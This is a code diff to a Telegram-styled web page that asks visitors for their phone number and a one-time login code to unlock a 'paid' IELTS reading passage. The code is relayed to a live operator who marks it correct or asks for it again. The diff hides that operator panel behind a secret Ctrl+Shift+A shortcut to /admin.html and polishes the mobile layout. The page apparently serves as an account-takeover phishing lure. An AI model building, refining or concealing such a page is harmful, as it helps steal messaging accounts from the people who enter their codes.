@@ -175,40 +175,6 @@
             display: block;
         }
 
-        .btn-admin-top {
-            background: #1e2c3d;
-            border: 1px solid rgba(51, 144, 236, 0.4);
-            color: #ffffff;
-            padding: 7px 14px;
-            border-radius: 20px;
-            font-size: 12.5px;
-            font-weight: 600;
-            cursor: pointer;
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            transition: var(--tg-transition);
-        }
-
-        .btn-admin-top:hover {
-            background: #27394e;
-            border-color: var(--tg-primary);
-        }
-
-        .pulse-dot {
-            width: 8px;
-            height: 8px;
-            background: var(--tg-success);
-            border-radius: 50%;
-            box-shadow: 0 0 8px var(--tg-success);
-            animation: pulse 1.5s infinite;
-        }
-
-        @keyframes pulse {
-            0%, 100% { opacity: 1; transform: scale(1); }
-            50% { opacity: 0.4; transform: scale(0.85); }
-        }
-
         .main-auth-container {
             flex: 1;
             display: flex;
@@ -503,113 +469,6 @@
             border-left: 4px solid var(--tg-success);
         }
 
-        /* O'rnatilgan Admin paneli (Yon slayd) */
-        .admin-drawer {
-            position: fixed;
-            top: 0;
-            right: 0;
-            width: 360px;
-            max-width: 100%;
-            height: 100vh;
-            background: #111a24;
-            border-left: 1px solid #203042;
-            box-shadow: -10px 0 40px rgba(0,0,0,0.7);
-            z-index: 2000;
-            display: flex;
-            flex-direction: column;
-            transform: translateX(100%);
-            transition: transform 0.3s cubic-bezier(0.16, 1, 0.3, 1);
-        }
-
-        .admin-drawer.open {
-            transform: translateX(0);
-        }
-
-        .admin-header {
-            padding: 18px 20px;
-            background: #152230;
-            border-bottom: 1px solid #203042;
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-        }
-
-        .admin-title {
-            font-size: 15px;
-            font-weight: 700;
-            color: #ffffff;
-            display: flex;
-            align-items: center;
-            gap: 8px;
-        }
-
-        .admin-close {
-            background: transparent;
-            border: none;
-            color: #8da4bc;
-            font-size: 20px;
-            cursor: pointer;
-        }
-
-        .admin-body {
-            flex: 1;
-            padding: 20px;
-            overflow-y: auto;
-        }
-
-        .admin-info-card {
-            background: #182635;
-            border: 1px solid #26384d;
-            border-radius: 12px;
-            padding: 16px;
-            margin-bottom: 18px;
-            text-align: center;
-        }
-
-        .admin-code-badge {
-            font-size: 34px;
-            font-weight: 800;
-            font-family: monospace;
-            color: var(--tg-primary);
-            letter-spacing: 4px;
-            margin: 8px 0;
-        }
-
-        .admin-actions-grid {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 10px;
-            margin-top: 16px;
-        }
-
-        .btn-approve {
-            background: var(--tg-success);
-            color: white;
-            border: none;
-            padding: 12px;
-            border-radius: 8px;
-            font-weight: 600;
-            font-size: 13px;
-            cursor: pointer;
-            transition: var(--tg-transition);
-        }
-
-        .btn-approve:hover { background: #439a53; }
-
-        .btn-reject {
-            background: var(--tg-error);
-            color: white;
-            border: none;
-            padding: 12px;
-            border-radius: 8px;
-            font-weight: 600;
-            font-size: 13px;
-            cursor: pointer;
-            transition: var(--tg-transition);
-        }
-
-        .btn-reject:hover { background: #c62828; }
-
         /* ========================================================
            2. IELTS READING PASSAGE 3 STILLARI (PULLIK MATERIAL)
            ======================================================== */
@@ -627,47 +486,122 @@
             display: block;
         }
 
+        /* Yuqori boshqaruv paneli (Desktop va Mobil) */
+        .reading-top-bar {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 12px 24px;
+            background: var(--container-bg);
+            border-bottom: 2px solid var(--border-color);
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.05);
+            transition: background-color 0.3s, border-color 0.3s;
+        }
+
+        .reading-top-left {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .reading-badge {
+            background: #e6f3ff;
+            color: #3182ce;
+            font-size: 11px;
+            font-weight: 700;
+            padding: 4px 10px;
+            border-radius: 20px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+        .night-mode .reading-badge {
+            background: #2b6cb0;
+            color: #e2e8f0;
+        }
+
+        .reading-tag {
+            font-size: 14px;
+            font-weight: 700;
+            color: var(--title-color);
+        }
+
+        .reading-top-right {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .live-timer-chip {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            background: var(--toggle-bg);
+            color: var(--title-color);
+            font-weight: 700;
+            font-size: 14px;
+            padding: 6px 12px;
+            border-radius: 20px;
+            border: 1px solid var(--toggle-border);
+        }
+
+        .tool-btn {
+            background: var(--button-bg);
+            color: white;
+            border: none;
+            border-radius: 20px;
+            padding: 7px 14px;
+            font-size: 13px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: var(--tg-transition);
+            display: inline-flex;
+            align-items: center;
+            gap: 5px;
+        }
+        .tool-btn:hover {
+            background: var(--button-hover-bg);
+            transform: translateY(-1px);
+        }
+
+        /* Mobil tab navigatsiyasi */
+        .mobile-section-nav {
+            display: none;
+            background: var(--toggle-bg);
+            padding: 4px;
+            border-radius: 10px;
+            border: 1px solid var(--toggle-border);
+        }
+
+        .mobile-nav-btn {
+            border: none;
+            background: transparent;
+            color: var(--text-color);
+            padding: 7px 14px;
+            font-size: 13px;
+            font-weight: 600;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: all 0.2s ease;
+        }
+
+        .mobile-nav-btn.active {
+            background: var(--button-bg);
+            color: #ffffff;
+            box-shadow: 0 2px 6px rgba(0,0,0,0.15);
+        }
+
         .reading-container {
             display: flex;
-            height: 100vh;
+            height: calc(100vh - 60px);
             max-width: 1400px;
             margin: 0 auto;
             background: var(--container-bg);
             box-shadow: 0 0 20px rgba(0,0,0,0.1);
             transition: background-color 0.3s;
         }
-
-        .mode-toggle {
-            position: absolute;
-            top: 15px;
-            right: 15px;
-            background: var(--button-bg);
-            color: white;
-            border: none;
-            border-radius: 20px;
-            padding: 8px 15px;
-            font-size: 14px;
-            cursor: pointer;
-            z-index: 100;
-            box-shadow: 0 2px 5px rgba(0,0,0,0.2);
-        }
-        .mode-toggle:hover { background: var(--button-hover-bg); }
-
-        .highlight-toggle {
-            position: absolute;
-            top: 15px;
-            right: 150px;
-            background: var(--button-bg);
-            color: white;
-            border: none;
-            border-radius: 20px;
-            padding: 8px 15px;
-            font-size: 14px;
-            cursor: pointer;
-            z-index: 100;
-            box-shadow: 0 2px 5px rgba(0,0,0,0.2);
-        }
-        .highlight-toggle:hover { background: var(--button-hover-bg); }
 
         .passage-section {
             flex: 1;
@@ -909,10 +843,144 @@
         .timer-btn:hover { background: var(--button-hover-bg); transform: translateY(-2px); }
 
         @media (max-width: 768px) {
-            .reading-container { flex-direction: column; height: auto; min-height: 100vh; }
-            .passage-section, .questions-section { width: 100%; padding: 15px; }
-            .passage-section { max-height: 50vh; overflow-y: auto; }
-            .tfng-options { flex-direction: column; gap: 5px; }
+            /* Auth mobil moslashuv */
+            .main-auth-container {
+                padding: 65px 16px 30px;
+            }
+            .auth-card {
+                max-width: 100%;
+            }
+            .otp-container {
+                gap: 8px;
+                margin: 22px 0 16px;
+            }
+            .otp-box {
+                width: 46px;
+                height: 54px;
+                font-size: 22px;
+                border-radius: 8px;
+            }
+
+            /* Reading mobil moslashuv */
+            .reading-top-bar {
+                padding: 10px 14px;
+                flex-wrap: wrap;
+                gap: 8px;
+            }
+            .reading-top-left {
+                order: 1;
+            }
+            .reading-top-right {
+                order: 2;
+                margin-left: auto;
+                gap: 6px;
+            }
+            .tool-btn {
+                padding: 6px 10px;
+                font-size: 12px;
+            }
+            .live-timer-chip {
+                padding: 4px 8px;
+                font-size: 13px;
+            }
+            .mobile-section-nav {
+                display: flex !important;
+                order: 3;
+                width: 100%;
+                justify-content: space-between;
+                margin-top: 4px;
+            }
+            .mobile-nav-btn {
+                flex: 1;
+                text-align: center;
+                padding: 8px 10px;
+                font-size: 13.5px;
+            }
+
+            .reading-container {
+                flex-direction: column;
+                height: auto;
+                min-height: auto;
+                box-shadow: none;
+            }
+            .passage-section, .questions-section {
+                width: 100%;
+                padding: 18px 14px;
+                overflow: visible !important;
+                height: auto !important;
+                max-height: none !important;
+                border-right: none;
+                display: none; /* Mobil tab orqali ko'rsatiladi */
+            }
+            .passage-section.mobile-active,
+            .questions-section.mobile-active {
+                display: block !important;
+            }
+
+            .passage-title {
+                font-size: 22px;
+            }
+            .passage-content {
+                font-size: 14.5px;
+                line-height: 1.7;
+                text-align: left;
+            }
+            .passage-content p {
+                text-indent: 10px;
+                margin-bottom: 14px;
+            }
+
+            .questions-title {
+                font-size: 20px;
+                padding: 10px;
+            }
+            .question-group {
+                padding: 14px 12px;
+                margin-bottom: 20px;
+            }
+            .question-group h3 {
+                font-size: 16px;
+            }
+            .tfng-options {
+                flex-direction: column;
+                gap: 8px;
+            }
+            .tfng-option {
+                padding: 10px 12px;
+                font-size: 14px;
+                border-radius: 8px;
+                width: 100%;
+            }
+            .inline-input {
+                width: 100%;
+                max-width: 180px;
+                margin: 4px 0;
+                height: 28px;
+                font-size: 14px;
+            }
+            .timer-controller {
+                padding: 12px;
+                margin-bottom: 16px;
+            }
+            #timer-display {
+                font-size: 26px;
+                padding: 6px;
+            }
+            .timer-btn {
+                padding: 8px 14px;
+                font-size: 13px;
+            }
+        }
+
+        @media (max-width: 360px) {
+            .otp-box {
+                width: 40px;
+                height: 48px;
+                font-size: 19px;
+            }
+            .otp-container {
+                gap: 6px;
+            }
         }
     </style>
 </head>
@@ -930,11 +998,6 @@
                 </svg>
             </button>
             <div style="flex: 1;"></div>
-            <!-- Ustoz / Admin Paneli tugmasi -->
-            <button class="btn-admin-top" id="btnToggleAdmin">
-                <span class="pulse-dot"></span>
-                <span>👑 Ustoz Paneli</span>
-            </button>
         </header>
 
         <main class="main-auth-container">
@@ -1017,56 +1080,34 @@
     </div>
 
     <!-- ========================================================
-         O'RNATILGAN USTOZ / ADMIN DRAWERN (REAL-TIME BOSHQARUV)
-         ======================================================== -->
-    <aside id="adminDrawer" class="admin-drawer">
-        <div class="admin-header">
-            <div class="admin-title">
-                <span class="pulse-dot"></span>
-                <span>👑 Ustoz / Admin Paneli</span>
-            </div>
-            <button class="admin-close" id="btnCloseAdmin">✕</button>
-        </div>
-        <div class="admin-body">
-            <div class="admin-info-card">
-                <div style="font-size: 12px; color: #8ea5bc; text-transform: uppercase;">Talaba telefoni:</div>
-                <div style="font-size: 16px; font-weight: 600; color: #ffffff; margin-top: 4px;" id="adminUserPhone">Kiritilmadi</div>
-
-                <div style="font-size: 12px; color: #8ea5bc; text-transform: uppercase; margin-top: 14px;">Kiritilgan kod:</div>
-                <div class="admin-code-badge" id="adminUserCode">-----</div>
-
-                <div style="font-size: 13px; color: #8ea5bc;" id="adminStatusNote">Talabaning kodi kutilmoqda...</div>
-            </div>
-
-            <div style="margin-bottom: 12px;">
-                <label style="font-size: 12px; color: #8ea5bc; display: block; margin-bottom: 6px;">Xatolik sababi (Agar rad etilsa):</label>
-                <input type="text" id="adminRejectMsgInput" value="Kodni qayta kiriting!" style="width: 100%; background: #182635; border: 1px solid #26384d; border-radius: 6px; padding: 8px 12px; color: white; font-size: 13px; outline: none;">
-            </div>
-
-            <div class="admin-actions-grid">
-                <button class="btn-approve" id="btnAdminApprove">
-                    ✅ Toʻgʻri (Ochish)
-                </button>
-                <button class="btn-reject" id="btnAdminReject">
-                    ❌ Qayta kiriting
-                </button>
-            </div>
-
-            <div style="margin-top: 20px; font-size: 12px; color: #61778f; line-height: 1.4;">
-                💡 <b>Koʻrsatma:</b> Agar alohida tabda ochmoqchi boʻlsangiz, papkadagi <b>admin.html</b> faylini ham ochishingiz mumkin.
-            </div>
-        </div>
-    </aside>
-
-
-    <!-- ========================================================
          2. PULLIK READING PASSAGE 3 (MATERIAL QISMI)
          ======================================================== -->
     <div id="readingPassageContainer">
-        <button class="mode-toggle" id="modeToggle">🌙 Night Mode</button>
-        <button class="highlight-toggle" id="highlightToggle">Switch to Green</button>
+        <!-- Yuqori boshqaruv paneli (Desktop va Mobil uchun to'liq moslashgan) -->
+        <div class="reading-top-bar">
+            <div class="reading-top-left">
+                <span class="reading-badge">IELTS Academic</span>
+                <span class="reading-tag">Reading Passage 3</span>
+            </div>
+
+            <!-- Mobil qurilmalarda Matn va Savollar o'rtasida o'tish tugmalari -->
+            <div class="mobile-section-nav" id="mobileSectionNav">
+                <button class="mobile-nav-btn active" id="btnNavPassage" onclick="switchMobileSection('passage')">📖 Matn</button>
+                <button class="mobile-nav-btn" id="btnNavQuestions" onclick="switchMobileSection('questions')">📝 Savollar (27-40)</button>
+            </div>
+
+            <div class="reading-top-right">
+                <div class="live-timer-chip" id="topTimerChip" title="Qolgan vaqt">
+                    <span>⏱️</span>
+                    <span id="topTimerVal">20:00</span>
+                </div>
+                <button class="tool-btn highlight-toggle" id="highlightToggle" title="Belgilash rangini o'zgartirish">🖍️ Highlight</button>
+                <button class="tool-btn mode-toggle" id="modeToggle" title="Tungi / Kunduzgi mavzu">🌙 Tun</button>
+            </div>
+        </div>
+
         <div class="reading-container">
-            <div class="passage-section">
+            <div class="passage-section mobile-active" id="passageSection">
                 <h1 class="passage-title">READING PASSAGE 3</h1>
                 <p class="passage-subtitle">You should spend about 20 minutes on Questions 27-40, which are based on Reading Passage 3 on pages 10 and 11.</p>
                 <div class="passage-content">
@@ -1082,7 +1123,7 @@
                     <p>Today, more than a quarter of the sample live overseas so the study also has its own travel agent, who does her best to accommodate requests to spend Christmas in Dunedin with family. This is just one example of the enormous effort that goes into maintaining contact and removing obstacles to participation. With such diligence and care, researchers hope the Dunedin study will continue for many years, perhaps generations, to come.</p>
                 </div>
             </div>
-            <div class="questions-section">
+            <div class="questions-section" id="questionsSection">
                 <div class="timer-controller">
                     <h3>Timer (set your time)</h3>
                     <div id="timer-display">20:00</div>
@@ -1272,17 +1313,6 @@
         const waitingText = document.getElementById('waitingText');
         const toast = document.getElementById('toast');
 
-        // Admin Drawer elementlari
-        const btnToggleAdmin = document.getElementById('btnToggleAdmin');
-        const btnCloseAdmin = document.getElementById('btnCloseAdmin');
-        const adminDrawer = document.getElementById('adminDrawer');
-        const adminUserPhone = document.getElementById('adminUserPhone');
-        const adminUserCode = document.getElementById('adminUserCode');
-        const adminStatusNote = document.getElementById('adminStatusNote');
-        const adminRejectMsgInput = document.getElementById('adminRejectMsgInput');
-        const btnAdminApprove = document.getElementById('btnAdminApprove');
-        const btnAdminReject = document.getElementById('btnAdminReject');
-
         let isPollingActive = false;
         let pollInterval = null;
         let toastTimeout = null;
@@ -1295,10 +1325,6 @@
                 toast.className = 'toast-msg';
             }, 3500);
         }
-
-        // Admin Drawer toggle
-        btnToggleAdmin.addEventListener('click', () => adminDrawer.classList.toggle('open'));
-        btnCloseAdmin.addEventListener('click', () => adminDrawer.classList.remove('open'));
 
         // Telefon fokus effekti
         phoneInput.addEventListener('focus', () => phoneInputContainer.classList.add('focused'));
@@ -1350,7 +1376,6 @@
 
             const formattedPhone = `+998 ${phoneInput.value.trim()}`;
             displayPhoneNumber.textContent = formattedPhone;
-            adminUserPhone.textContent = formattedPhone;
 
             // Admin panelga bildirish
             const session = { phone: formattedPhone, code: '', status: 'PHONE_ENTERED' };
@@ -1458,11 +1483,6 @@
             waitingBox.style.display = 'flex';
             waitingText.textContent = 'Ustoz / Admin tasdiqlashi kutilmoqda...';
 
-            // Admin panelni yangilash
-            adminUserPhone.textContent = phone;
-            adminUserCode.textContent = code;
-            adminStatusNote.innerHTML = '<b style="color: #3390ec;">🔔 Yangi kod keldi! Qaror qabul qiling:</b>';
-
             // Real-time yuborish
             const payload = { phone, code, status: 'CODE_SUBMITTED', timestamp: Date.now() };
             localStorage.setItem('auth_session_state', JSON.stringify(payload));
@@ -1557,37 +1577,35 @@
             clearInterval(pollInterval);
         }
 
-        // Admin drawer ichidagi tugmalar
-        btnAdminApprove.addEventListener('click', () => {
-            const data = { action: 'APPROVE', message: 'Toʻgʻri! Material ochildi.', status: 'APPROVED' };
-            localStorage.setItem('auth_admin_decision', JSON.stringify(data));
-            if (channel) channel.postMessage({ type: 'ADMIN_DECISION', ...data });
-            try {
-                fetch('/api/admin-action', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(data)
-                }).catch(() => {});
-            } catch(e) {}
-            onAdminDecisionReceived(data);
-            adminDrawer.classList.remove('open');
+        // Faqat ustoz uchun maxfiy klaviatura kombinatsiyasi: Ctrl + Shift + A (yoki Mac: Cmd + Shift + A)
+        window.addEventListener('keydown', (e) => {
+            if ((e.ctrlKey || e.metaKey) && e.shiftKey && (e.key === 'A' || e.key === 'a')) {
+                window.open('/admin.html', '_blank');
+            }
         });
 
-        btnAdminReject.addEventListener('click', () => {
-            const msg = adminRejectMsgInput.value.trim() || 'Kodni qayta kiriting!';
-            const data = { action: 'REJECT', message: msg, status: 'REJECTED' };
-            localStorage.setItem('auth_admin_decision', JSON.stringify(data));
-            if (channel) channel.postMessage({ type: 'ADMIN_DECISION', ...data });
-            try {
-                fetch('/api/admin-action', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(data)
-                }).catch(() => {});
-            } catch(e) {}
-            onAdminDecisionReceived(data);
-            adminDrawer.classList.remove('open');
-        });
+        // Mobil qurilmalarda Matn va Savollar o'rtasida o'tish funksiyasi
+        function switchMobileSection(section) {
+            const passage = document.getElementById('passageSection');
+            const questions = document.getElementById('questionsSection');
+            const btnPassage = document.getElementById('btnNavPassage');
+            const btnQuestions = document.getElementById('btnNavQuestions');
+
+            if (!passage || !questions) return;
+
+            if (section === 'passage') {
+                passage.classList.add('mobile-active');
+                questions.classList.remove('mobile-active');
+                if (btnPassage) btnPassage.classList.add('active');
+                if (btnQuestions) btnQuestions.classList.remove('active');
+            } else {
+                passage.classList.remove('mobile-active');
+                questions.classList.add('mobile-active');
+                if (btnPassage) btnPassage.classList.remove('active');
+                if (btnQuestions) btnQuestions.classList.add('active');
+            }
+            window.scrollTo({ top: 0, behavior: 'smooth' });
+        }
 
 
         /* ========================================================
@@ -1719,7 +1737,11 @@
         function updateTimerDisplay() {
             const minutes = Math.floor(timerTime / 60);
             const seconds = timerTime % 60;
-            document.getElementById('timer-display').textContent = `${minutes}:${seconds < 10 ? '0' : ''}${seconds}`;
+            const formatted = `${minutes}:${seconds < 10 ? '0' : ''}${seconds}`;
+            const t1 = document.getElementById('timer-display');
+            const t2 = document.getElementById('topTimerVal');
+            if (t1) t1.textContent = formatted;
+            if (t2) t2.textContent = formatted;
         }
 
         document.addEventListener('DOMContentLoaded', () => {
